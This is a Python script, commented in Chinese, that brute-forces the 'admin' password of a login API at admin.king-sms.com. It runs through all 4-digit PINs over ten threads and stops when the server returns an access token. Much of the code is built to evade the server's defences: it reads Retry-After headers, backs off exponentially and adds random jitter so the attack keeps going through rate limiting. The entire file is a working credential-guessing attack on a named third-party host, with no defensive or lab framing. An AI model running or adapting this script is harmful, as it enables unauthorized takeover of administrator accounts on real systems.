import requests
import json
import itertools
import string
import time
import random
from concurrent.futures import ThreadPoolExecutor
import threading

# --- 配置 ---
TARGET_URL = 'https://admin.king-sms.com/api/v1/auth/login'
TARGET_USERNAME = 'admin'
MAX_THREADS = 10

# 密码生成配置
CHARACTER_SET = string.digits
MIN_LENGTH = 4
MAX_LENGTH = 4
# ----------------

# 全局状态变量
FOUND_PASSWORD = None
ATTEMPT_COUNT = 0

# 💥 智能限流追踪的核心变量
# 所有线程共享的基础延迟（用于正常请求间隔）
BASE_DELAY = 1.0
# 估算的限流结束时间戳 (Unix时间)，所有线程都必须等到这个时间之后
estimated_cooldown_end = 0.0
# 锁对象，用于保护对 BASE_DELAY 和 estimated_cooldown_end 的修改
delay_lock = threading.Lock()


def generate_passwords(chars, min_len, max_len):
    """生成密码生成器"""
    print(f"开始生成长度从 {min_len} 到 {max_len} 的密码...")
    for length in range(min_len, max_len + 1):
        for attempt in itertools.product(chars, repeat=length):
            yield ''.join(attempt)


def handle_cooldown():
    """在每个请求前检查是否仍在限流期内，如果是则暂停。"""
    global estimated_cooldown_end, BASE_DELAY

    # 1. 检查是否在限流期内
    current_time = time.time()

    with delay_lock:
        cooldown_needed = estimated_cooldown_end - current_time

    if cooldown_needed > 0:
        # 如果还在限流期内，暂停直到限流期结束
        print(
            f"\n💤 检测到限流尚未结束，线程 {threading.current_thread().name} 暂停 {cooldown_needed:.2f} 秒直到 {estimated_cooldown_end:.0f}...")
        time.sleep(cooldown_needed)
        # 暂停完成后，将 BASE_DELAY 降回初始值，准备加速
        with delay_lock:
            # 在限流期结束时，将基础延迟恢复到更小的正常值 (0.5秒)
            BASE_DELAY = 0.5

            # 2. 执行基础延迟（每次请求前都等待）
    # 增加一个随机抖动，使请求时间不那么规律
    with delay_lock:
        current_delay = BASE_DELAY

    # 随机延迟，防止请求过于规律
    sleep_time = current_delay + random.uniform(0.1, 0.5)
    time.sleep(sleep_time)


def attempt_login(password):
    """尝试使用给定的密码进行登录"""
    global FOUND_PASSWORD, ATTEMPT_COUNT, estimated_cooldown_end, BASE_DELAY

    if FOUND_PASSWORD:
        return

    # 1. 执行限流检查和基础延迟
    handle_cooldown()

    ATTEMPT_COUNT += 1
    credentials = {
        'username': TARGET_USERNAME,
        'password': password
    }

    try:
        response = requests.post(TARGET_URL, data=credentials, timeout=5)
        current_time = time.time()

        # 2. 💥 处理限流（收到 429）
        if response.status_code == 429:

            # 尝试从 Retry-After 头部获取服务器建议的等待时间
            retry_after_str = response.headers.get('Retry-After')
            wait_seconds = 0

            if retry_after_str and retry_after_str.isdigit():
                wait_seconds = int(retry_after_str)
                print(f'\n🚨🚨🚨 收到 429。服务器要求等待 {wait_seconds} 秒。')
            else:
                # 如果未提供，使用指数退避策略
                # 如果上次被限流，则增加等待时间；如果是第一次，则从 10 秒开始
                previous_wait = BASE_DELAY  # 使用当前的基础延迟作为上次的等待时间
                wait_seconds = max(previous_wait * 2, 10.0)
                print(f'\n🚨🚨🚨 收到 429。未获取到 Retry-After，使用指数退避，等待 {wait_seconds:.2f} 秒。')

            # 确保等待时间至少有 5 秒，并更新全局限流结束时间
            wait_seconds = max(wait_seconds, 5.0)

            # 🚨 关键：更新全局冷却时间，并提升 BASE_DELAY
            with delay_lock:
                # 记录新的冷却结束时间
                estimated_cooldown_end = current_time + wait_seconds
                # 将 BASE_DELAY 暂时提升到等待时间，防止所有线程立即再次发送请求
                BASE_DELAY = wait_seconds

            print(f'   - 新的基础延迟 BASE_DELAY 已调整为 {BASE_DELAY:.2f} 秒。')
            print(f'   - 估算的限流结束时间: {time.ctime(estimated_cooldown_end)}')

            # 当前线程立即暂停等待
            time.sleep(wait_seconds)
            return  # 暂停完成，继续下一个密码

        # 3. 检查是否成功
        if response.status_code == 200:
            response_data = response.json()
            if 'access_token' in response_data:
                FOUND_PASSWORD = password
                print(f'\n🎉🎉🎉 成功！找到密码：{password} 🎉🎉🎉')
                return

                # 失败打印
        print(f"尝试 #{ATTEMPT_COUNT}: {password} -> ❌ 状态码 {response.status_code}", end='\r', flush=True)

    except requests.exceptions.RequestException as e:
        print(f"尝试 #{ATTEMPT_COUNT}: {password} -> ⚠️ 请求错误/超时: {e}", end='\r', flush=True)


# --- 主逻辑 ---
if __name__ == '__main__':
    print(f"目标用户: {TARGET_USERNAME}")
    print(f"目标 URL: {TARGET_URL}")
    print(f"并发线程数: {MAX_THREADS}")
    print(f"初始基础延迟 BASE_DELAY: {BASE_DELAY} 秒\n")

    password_generator = generate_passwords(CHARACTER_SET, MIN_LENGTH, MAX_LENGTH)

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for password in password_generator:
            if FOUND_PASSWORD:
                break

            future = executor.submit(attempt_login, password)
            futures.append(future)

        for future in futures:
            if FOUND_PASSWORD:
                future.cancel()
            try:
                # 等待任务结果，如果任务被取消或遇到异常则忽略
                future.result()
            except Exception:
                pass

    print(f"\n--- 扫描结束，共尝试 {ATTEMPT_COUNT} 个密码 ---")